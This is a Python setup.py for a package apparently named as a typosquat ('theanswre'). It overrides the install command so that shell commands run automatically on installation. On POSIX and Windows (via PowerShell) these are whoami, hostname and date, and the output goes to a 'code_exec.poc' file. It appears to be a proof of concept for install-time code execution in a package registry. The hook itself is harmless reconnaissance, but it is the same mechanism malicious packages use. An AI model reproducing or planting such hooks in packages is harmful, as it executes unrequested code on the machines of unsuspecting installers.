from setuptools import setup, find_packages
from setuptools.command.install import install
import os

class CustomInstallCommand(install):
    def run(self):
        if os.name == 'posix':
            os.system('whoami;hostname;date > /tmp/code_exec.poc')
        elif os.name == 'nt':
            os.system('powershell.exe "whoami;hostname;date > ~/Documents/code_exec.poc"')
        super().run()

setup(
    name='theanswre',
    version='0.2.5',
    package_dir={"": "src"},
    packages=find_packages(where='src'),
    install_requires=[''],
    cmdclass={
        "install": CustomInstallCommand,
    }
)
